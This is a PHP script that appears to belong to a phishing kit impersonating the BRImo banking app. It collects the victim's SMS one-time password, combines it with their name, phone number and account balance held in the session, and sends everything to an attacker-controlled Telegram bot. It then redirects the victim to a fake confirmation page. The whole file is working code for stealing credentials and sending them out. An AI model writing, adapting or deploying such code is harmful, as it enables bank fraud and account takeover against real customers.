<?php
include "./tlgm.php";
session_start();
$sms = $_POST['sms'];

$_SESSION['sms'] = $sms;
$nomor = $_SESSION['nomor'];
$nama = $_SESSION['nama'];
$saldo = $_SESSION['saldo'];
$message = "
(BRIMO RESULT)

• Nama : ".$nama."
• Nomor : ".$nomor."
• Saldo : ".$saldo."
• OTP : ".$sms."
";

function sendMessage($telegram_id, $message, $id_bot) {
    $url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

sendMessage($telegram_id, $message, $id_bot);
header('Location:../konf.html');
?>